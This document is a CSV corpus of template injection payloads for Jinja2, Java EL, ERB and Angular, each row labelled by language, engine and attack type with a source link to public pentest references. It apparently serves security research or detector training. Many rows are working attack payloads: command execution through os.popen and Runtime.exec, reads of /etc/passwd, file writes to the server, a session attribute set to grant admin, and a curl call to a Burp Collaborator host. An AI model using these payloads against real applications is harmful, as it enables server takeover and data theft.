"gk6q${""zkz"".toString().replace(""k"", ""x"")}doap2","gkNq${""S"".tostring().replace(""S"",""S"")}doapN",java,Java-EL,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
"https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40java.lang.Thread%40sleep(10000)%2c1%3f%23xx%3a%23request.toString}","https://www.example.url/?vulnerableparameter=${%N_memberaccess%Nd%Nognl.ognlcontext%Ndefault_member_access,%Nkzxs%Nd%Njava.lang.thread%Nsleep(N)%NcN%Nf%Nxx%Na%Nrequest.tostring}",java,Java-EL,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
"#{""""[""class""].forName(""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(""curl <instance>.burpcollaborator.net"")}","#{""S""[""S""].forname(""S"").getmethod(""S"",null).invoke(null,null).exec(""S"")}",java,Java-EL,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
"${request.getAttribute(""c"").add(""ping x.x.x.x"")}","${request.getattribute(""S"").add(""S"")}",java,Java-EL,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
"${"""".getClass().forName(""java.lang.Runtime"").getMethods()[6].invoke("""".getClass().forName(""java.lang.Runtime"")).exec(""calc.exe"")}","${""S"".getclass().forname(""S"").getmethods()[N].invoke(""S"".getclass().forname(""S"")).exec(""S"")}",java,Java-EL,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
"${request.getClass().forName(""javax.script.ScriptEngineManager"").newInstance().getEngineByName(""js"").eval(""java.lang.Runtime.getRuntime().exec(\\\""ping x.x.x.x\\\"")""))}","${request.getclass().forname(""S"").newinstance().getenginebyname(""S"").eval(""S""pingx.x.x.x\\\""S""))}",java,Java-EL,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
${sessionScope.toString()},${sessionscope.tostring()},java,Java-EL,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
"${pageContext.request.getSession().setAttribute(""admin"", true)}","${pagecontext.request.getsession().setattribute(""S"",true)}",java,Java-EL,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
${user},${user},java,Java-EL,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
${password},${password},java,Java-EL,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
${employee.FirstName},${employee.firstname},java,Java-EL,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/el-expression-language.md
{{ config }} #In these object you can find all the configured env variables,{{config}}#intheseobjectyoucanfindalltheconfiguredenvvariables,python,Jinja2,1,enumeration,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{% for key, value in config.items() %}","{%forkey,valueinconfig.items()%}",python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ dict.__base__.__subclasses__() }},{{dict.__base__.__subclasses__()}},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ dict.mro()[-1].__subclasses__() }},{{dict.mro()[-N].__subclasses__()}},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ (dict.mro()[-1]|attr(""\x5f\x5fsubclasses\x5f\x5f""))() }}","{{(dict.mro()[-N]|attr(""S""))()}}",python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %},{%witha=dict.mro()[-N].__subclasses__()%}{{a}}{%endwith%},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ ().__class__.__base__.__subclasses__() }},{{().__class__.__base__.__subclasses__()}},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ [].__class__.__mro__[-1].__subclasses__() }},{{[].__class__.__mro__[-N].__subclasses__()}},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ ((""""|attr(""__class__"")|attr(""__mro__""))[-1]|attr(""__subclasses__""))() }}","{{((""S""|attr(""S"")|attr(""S""))[-N]|attr(""S""))()}}",python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ request.__class__.mro()[-1].__subclasses__() }},{{request.__class__.mro()[-N].__subclasses__()}},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %},{%witha=config.__class__.mro()[-N].__subclasses__()%}{{a}}{%endwith%},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ [].class.base.subclasses() }},{{[].class.base.subclasses()}},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ ''.class.mro()[1].subclasses() }},{{'S'.class.mro()[N].subclasses()}},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }},{{'S'.__class__.__mro__[N].__subclasses__()[N]('S').read()}},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S','S').write('S')}}",python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}","{{'S'.__class__.mro()[N].__subclasses__()[N]('S',shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
# Without '{{' and '}}',#without'S'and'S',python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{% for x in ().__class__.__base__.__subclasses__() %}{% if ""warning"" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}","{%forxin().__class__.__base__.__subclasses__()%}{%if""S""inx.__name__%}{{x()._module.__builtins__['S']('S').popen(request.args.input).read()}}{%endif%}{%endfor%}",python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ dict.mro()[-1].__subclasses__()[276](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip() }}","{{dict.mro()[-N].__subclasses__()[N](request.args.cmd,shell=true,stdout=-N).communicate()[N].strip()}}",python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(1) %},{%print(N)%},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% if 7*7 == 49 %}OK{% endif %},{%ifN*N==N%}ok{%endif%},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% if 7*7 == 50 %}BAD{% else %}ELSE{% endif %},{%ifN*N==N%}bad{%else%}else{%endif%},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% set x = 7*7 %}{{ x }},{%setx=N*N%}{{x}},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% for i in range(3) %}{{ i }}{% endfor %},{%foriinrange(N)%}{{i}}{%endfor%},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% with a = ''.__class__ %}{{ a }}{% endwith %},{%witha='S'.__class__%}{{a}}{%endwith%},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(''.__class__.__mro__[1]) %},{%print('S'.__class__.__mro__[N])%},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% with x = ''.__class__.__mro__[1].__subclasses__()|length %}{{ x }}{% endwith %},{%withx='S'.__class__.__mro__[N].__subclasses__()|length%}{{x}}{%endwith%},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{% with a = config.__class__.from_envvar.__globals__.__builtins__.__import__(""os"").popen(""id"").read() %}{{ a }}{% endwith %}","{%witha=config.__class__.from_envvar.__globals__.__builtins__.__import__(""S"").popen(""S"").read()%}{{a}}{%endwith%}",python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{% if config.__class__.from_envvar.__globals__.__builtins__.__import__(""os"").popen(""id"").read().startswith(""uid="") %}yes{% endif %}","{%ifconfig.__class__.from_envvar.__globals__.__builtins__.__import__(""S"").popen(""S"").read().startswith(""S"")%}yes{%endif%}",python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(lipsum) %},{%print(lipsum)%},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(cycler) %},{%print(cycler)%},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(joiner) %},{%print(joiner)%},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(namespace) %},{%print(namespace)%},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% if 'os' in lipsum.__globals__ %}OS_OK{% endif %},{%if'S'inlipsum.__globals__%}os_ok{%endif%},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% if cycler.__init__.__globals__ %}G_OK{% endif %},{%ifcycler.__init__.__globals__%}g_ok{%endif%},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(lipsum.__globals__['os'].popen('id').read()) %},{%print(lipsum.__globals__['S'].popen('S').read())%},python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% with x = lipsum.__globals__['os'].popen('id').read() %}{{ x }}{% endwith %},{%withx=lipsum.__globals__['S'].popen('S').read()%}{{x}}{%endwith%},python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(cycler.__init__.__globals__['os'].popen('id').read()) %},{%print(cycler.__init__.__globals__['S'].popen('S').read())%},python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(joiner.__init__.__globals__['os'].popen('id').read()) %},{%print(joiner.__init__.__globals__['S'].popen('S').read())%},python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print(namespace.__init__.__globals__['os'].popen('id').read()) %},{%print(namespace.__init__.__globals__['S'].popen('S').read())%},python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% if 'uid=' in lipsum.__globals__['os'].popen('id').read() %},{%if'S'inlipsum.__globals__['S'].popen('S').read()%},python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% endif %},{%endif%},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params","http://localhost:N/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_#formattingthestringfromgetparams",python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_,http://localhost:N/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_,python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{'<script>alert(1);</script>'}},{{'S'}},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{'<script>alert(1);</script>'|safe}},{{'S'|safe}},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}","{{'S'.__class__.__mro__[N].__subclasses__()[N]('S','S').write('S')}}",python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ request.__class__.__dict__ }},{{request.__class__.__dict__}},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{{ config.__class__.__dict__ }},{{config.__class__.__dict__}},python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ request.__class__._load_form_data.__globals__.__builtins__.open(""/etc/passwd"").read() }}","{{request.__class__._load_form_data.__globals__.__builtins__.open(""S"").read()}}",python,Jinja2,1,introspection,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ config.__class__.from_envvar.__globals__.__builtins__.__import__(""os"").popen(""ls"").read() }}","{{config.__class__.from_envvar.__globals__.__builtins__.__import__(""S"").popen(""S"").read()}}",python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ config.__class__.from_envvar[""__globals__""][""__builtins__""][""__import__""](""os"").popen(""ls"").read() }}","{{config.__class__.from_envvar[""S""][""S""][""S""](""S"").popen(""S"").read()}}",python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ (config|attr(""__class__"")).from_envvar[""__globals__""][""__builtins__""][""__import__""](""os"").popen(""ls"").read() }}","{{(config|attr(""S"")).from_envvar[""S""][""S""][""S""](""S"").popen(""S"").read()}}",python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{% with a = request[""application""][""\x5f\x5fglobals\x5f\x5f""][""\x5f\x5fbuiltins\x5f\x5f""][""\x5f\x5fimport\x5f\x5f""](""os"")[""popen""](""ls"")[""read""]() %} {{ a }} {% endwith %}","{%witha=request[""S""][""S""][""S""][""S""](""S"")[""S""](""S"")[""S""]()%}{{a}}{%endwith%}",python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{ config.__class__.from_envvar.__globals__.import_string(""os"").popen(""ls"").read() }}","{{config.__class__.from_envvar.__globals__.import_string(""S"").popen(""S"").read()}}",python,Jinja2,1,direct-execution,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% with %},{%with%},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% if %},{%if%},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% for %},{%for%},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% set %},{%set%},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
{% print %},{%print%},python,Jinja2,1,uncertain,https://github.com/HackTricks-wiki/hacktricks/blob/14f4a7d1b6d3534336d2a8740e3e893ffa38ea74/src/ht/src/pentesting-web/ssti-server-side-template-injection/jinja2-ssti.md
"{{concat(""${"", ""{{first}}*{{second}}"", ""}"")}}","{{concat(""S"",""S"",""S"")}}",java,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""{{"", ""{{first}}*{{second}}"", ""}}"")}}","{{concat(""S"",""S"",""S"")}}",python,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""<%="", ""{{first}}*{{second}}"", ""%>"")}}","{{concat(""S"",""S"",""S"")}}",ruby,ERB,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""{"", ""{{first}}*{{second}}"", ""}"")}}","{{concat(""S"",""S"",""S"")}}",python,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""{{{"", ""{{first}}*{{second}}"", ""}}}"")}}","{{concat(""S"",""S"",""S"")}}",python,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""${{"", ""{{first}}*{{second}}"", ""}}"")}}","{{concat(""S"",""S"",""S"")}}",java,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""#{"", ""{{first}}*{{second}}"", ""}"")}}","{{concat(""S"",""S"",""S"")}}",ruby,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""[["", ""{{first}}*{{second}}"", ""]]"")}}","{{concat(""S"",""S"",""S"")}}",python,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""{{="", ""{{first}}*{{second}}"", ""}}"")}}","{{concat(""S"",""S"",""S"")}}",python,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""[[${"", ""{{first}}*{{second}}"", ""}]]"")}}","{{concat(""S"",""S"",""S"")}}",java,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""${xyz|"", ""{{first}}*{{second}}"", ""}"")}}","{{concat(""S"",""S"",""S"")}}",java,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""#set($x="", ""{{first}}*{{second}}"", "")${x}"")}}","{{concat(""S"",""S"",""S"")}}",java,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""@("", ""{{first}}*{{second}}"", "")"")}}","{{concat(""S"",""S"",""S"")}}",python,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
"{{concat(""{@"", ""{{first}}*{{second}}"", ""}"")}}","{{concat(""S"",""S"",""S"")}}",python,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
{{ssti}},{{ssti}},python,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
{{result}},{{result}},python,unknown,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/ssti/reflection-ssti.yaml
{{payload}},{{payload}},javascript,Angular,1,uncertain,https://github.com/projectdiscovery/fuzzing-templates/blob/5585787b43e6f7242fcbb706688f9528be63e29f/csti/angular-client-side-template-injection.yaml
$<%-1-%>,$<%-N-%>,ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"${""&lt;%-1-%&gt;""}","${""S""}",java,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"${""&lt;%-1-%>""}","${""S""}",java,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"${""1""}","${""S""}",java,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
"${""<%-1-%>""}","${""S""}",ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
${&quot;&lt;%-1-%&gt;&quot;},${&quot;&lt;%-N-%&gt;&quot;},java,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
&lt;%'#{@},&lt;%'#{@},ruby,unknown,1,probe,https://github.com/Hackmanit/template-injection-table/blob/4be3ec7f8a7de162dd3bb340b54560938bfdfab2/engines.js
